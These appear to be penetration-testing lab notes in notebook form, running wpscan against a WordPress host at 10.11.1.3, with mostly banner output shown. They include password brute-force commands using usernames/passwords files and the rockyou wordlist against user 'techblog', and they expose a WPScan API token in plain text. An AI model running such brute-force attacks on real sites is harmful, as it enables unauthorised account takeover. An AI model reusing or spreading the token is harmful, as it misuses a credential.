# %%
# !wpscan -U usernames.txt -P passwords.txt --url 10.11.1.3

# !wpscan -h
# Out:
# _______________________________________________________________
#          __          _______   _____
#          \ \        / /  __ \ / ____|
#           \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
#            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
#             \  /\  /  | |     ____) | (__| (_| | | | |
#              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
#
#          WordPress Security Scanner by the WPScan Team
#                          Version 3.8.18
#        Sponsored by Automattic - https://automattic.com/
#        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
# _______________________________________________________________
#
# Usage: wpscan [options]
#         --url URL                                 The URL of the blog to scan
#                                                   Allowed Protocols: http, https
#                                                   Default Protocol if none provided: http
# ...

# %%
# !wpscan --url 10.11.1.3 --api-token zAmWr9FnET5QcAdf2Xcb95xXJDOV7UTvGdNKUua1jLs
# Out:
# _______________________________________________________________
#          __          _______   _____
#          \ \        / /  __ \ / ____|
#           \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
#            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
#             \  /\  /  | |     ____) | (__| (_| | | | |
#              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
#
#          WordPress Security Scanner by the WPScan Team
#                          Version 3.8.18
#        Sponsored by Automattic - https://automattic.com/
#        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
# _______________________________________________________________
#
# [+] URL: http://10.11.1.3/ [10.11.1.3]
# [+] Started: Sat Oct 23 15:17:55 2021
#
# Interesting Finding(s):
#
# [+] Headers
#  | Interesting Entries:
#  |  - Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
#  |  - X-Powered-By: PHP/5.4.16
#  | Found By: Headers (Passive Detection)
#  | Confidence: 100%
#
# ...

# %%
# !wpscan -U techblog -P /usr/share/wordlists/rockyou.txt --url 10.11.1.3
# Out:
# _______________________________________________________________
#          __          _______   _____
#          \ \        / /  __ \ / ____|
#           \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
#            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
#             \  /\  /  | |     ____) | (__| (_| | | | |
#              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
#
#          WordPress Security Scanner by the WPScan Team
#                          Version 3.8.18
#        Sponsored by Automattic - https://automattic.com/
#        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
# _______________________________________________________________
#
# [+] URL: http://10.11.1.3/ [10.11.1.3]
# [+] Started: Sat Oct 23 15:23:25 2021
#
# Interesting Finding(s):
#
# [+] Headers
#  | Interesting Entries:
#  |  - Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
#  |  - X-Powered-By: PHP/5.4.16
#  | Found By: Headers (Passive Detection)
#  | Confidence: 100%
#
# ...
